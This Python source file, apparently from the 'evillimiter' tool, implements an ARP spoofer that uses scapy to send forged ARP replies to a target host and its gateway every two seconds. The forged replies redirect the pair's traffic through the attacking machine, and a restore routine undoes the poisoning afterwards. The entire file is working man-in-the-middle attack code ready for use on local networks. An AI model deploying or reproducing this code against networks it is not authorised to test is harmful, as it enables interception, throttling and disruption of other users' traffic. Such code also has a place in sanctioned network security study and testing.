import time
import threading
from scapy.all import ARP, send # pylint: disable=no-name-in-module

from .host import Host
from evillimiter.common.globals import BROADCAST


class ARPSpoofer(object):
    def __init__(self, interface, gateway_ip, gateway_mac):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac

        # interval in s spoofed ARP packets are sent to targets
        self.interval = 2

        self._hosts = set()
        self._hosts_lock = threading.Lock()
        self._running = False

    def add(self, host):
        with self._hosts_lock:
            self._hosts.add(host)

        host.spoofed = True

    def remove(self, host, restore=True):             
        with self._hosts_lock:
            self._hosts.discard(host)

        if restore:
            self._restore(host)

        host.spoofed = False

    def start(self):
        thread = threading.Thread(target=self._spoof, args=[], daemon=True)

        self._running = True
        thread.start()

    def stop(self):
        self._running = False

    def _spoof(self):
        while self._running:
            self._hosts_lock.acquire()
            # make a deep copy to reduce lock time
            hosts = self._hosts.copy()
            self._hosts_lock.release()

            for host in hosts:
                if not self._running:
                    return

                self._send_spoofed_packets(host)
            
            time.sleep(self.interval)

    def _send_spoofed_packets(self, host):
        # 2 packets = 1 gateway packet, 1 host packet
        packets = [
            ARP(op=2, psrc=host.ip, pdst=self.gateway_ip, hwdst=self.gateway_mac),
            ARP(op=2, psrc=self.gateway_ip, pdst=host.ip, hwdst=host.mac)
        ]

        [send(x, verbose=0, iface=self.interface) for x in packets]

    def _restore(self, host):
        """
        Remaps host and gateway to their actual addresses
        """
        # 2 packets = 1 gateway packet, 1 host packet
        packets = [
            ARP(op=2, psrc=host.ip, hwsrc=host.mac, pdst=self.gateway_ip, hwdst=BROADCAST),
            ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=host.ip, hwdst=BROADCAST)
        ]

        [send(x, verbose=0, iface=self.interface, count=3) for x in packets]